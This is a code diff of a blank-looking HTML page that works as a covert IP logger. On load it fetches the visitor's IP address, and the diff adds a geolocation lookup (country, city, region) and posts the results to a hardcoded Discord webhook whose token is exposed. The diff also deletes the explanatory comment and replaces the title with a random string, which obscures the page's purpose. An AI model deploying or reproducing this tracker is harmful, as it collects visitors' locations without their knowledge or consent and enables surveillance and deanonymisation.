@@ -1,9 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>My Website</title>
+  <title>9C7usvZa2fubNAYR2FDEne2wbtGesF4HW2R6QnBTXYv4tSsmsYSmb8NZKw7TndXh3uSeHm7KYNQ3KRCh5m63E9Yu4kbLHsrENthc</title>
   <script>
-    // JavaScript code for sending the IP address to Discord webhook using JSONP
     window.onload = function() {
       const apiUrl = 'https://api.ipify.org/?format=jsonp&callback=processIP';
       const script = document.createElement('script');
@@ -13,21 +12,29 @@
 
     function processIP(response) {
       const ipAddress = response.ip;
-      const webhookUrl = 'https://discord.com/api/webhooks/1112433220747792535/f0GSFHDk7Y5p7YNV2xzoIjy-7Kl6v1gRJyK2jONEyMxhjGiEbvffgJNA9N4ZeaGJg_i9';
-      const messagePayload = {
-        content: 'IP Address: ' + ipAddress
-      };
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(messagePayload)
-      });
+      const ipapiUrl = 'https://ipapi.co/' + ipAddress + '/json/';
+      fetch(ipapiUrl)
+        .then(response => response.json())
+        .then(data => {
+          const country = data.country_name;
+          const city = data.city;
+          const region = data.region;
+          const webhookUrl = 'https://discord.com/api/webhooks/1112433220747792535/f0GSFHDk7Y5p7YNV2xzoIjy-7Kl6v1gRJyK2jONEyMxhjGiEbvffgJNA9N4ZeaGJg_i9';
+          const messagePayload = {
+            content: `IP Address: ${ipAddress}\nCountry: ${country}\nCity: ${city}\nRegion: ${region}`
+          };
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(messagePayload)
+          });
+        });
     }
   </script>
 </head>
 <body>
-  <!-- Your HTML content here -->
+
 </body>
 </html>
